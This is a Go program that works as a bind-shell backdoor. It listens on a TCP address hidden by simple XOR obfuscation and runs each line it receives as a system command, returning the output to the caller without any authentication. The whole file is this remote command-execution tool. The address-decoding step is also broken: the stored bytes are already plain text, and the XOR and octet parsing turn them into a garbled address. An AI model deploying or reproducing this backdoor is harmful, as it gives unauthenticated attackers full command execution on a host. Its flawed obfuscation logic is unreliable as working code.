package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
)


func xorEncryptDecrypt(input []byte, key byte) []byte {
	result := make([]byte, len(input))
	for i := 0; i < len(input); i++ {
		result[i] = input[i] ^ key
	}
	return result
}

func main() {

	encryptedAddress := []byte{0x22, 0x31, 0x30, 0x2e, 0x31, 0x2e, 0x37, 0x35, 0x2e, 0x32, 0x30, 0x30, 0x3a, 0x38, 0x30, 0x38, 0x31, 0x22}


	key := byte(0x23)


	decryptedAddress := xorEncryptDecrypt(encryptedAddress, key)


	ipPortString := fmt.Sprintf("%d.%d.%d.%d:%d", decryptedAddress[0], decryptedAddress[1], decryptedAddress[2], decryptedAddress[3], (uint16(decryptedAddress[4])<<8)|uint16(decryptedAddress[5]))


	listener, err := net.Listen("tcp", ipPortString)
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close()

	fmt.Println("Server listening on", ipPortString)

	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			return
		}

		go handleConnection(conn)
	}
}


func handleConnection(conn net.Conn) {
	defer conn.Close()

	reader := bufio.NewReader(conn)

	for {
		message, err := reader.ReadString('\n')
		if err != nil {
			fmt.Println("Error reading from connection:", err)
			return
		}

		out, err := exec.Command(strings.TrimSuffix(message, "\n")).Output()
		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}

		fmt.Fprintf(conn, "%s\n", out)
	}
}
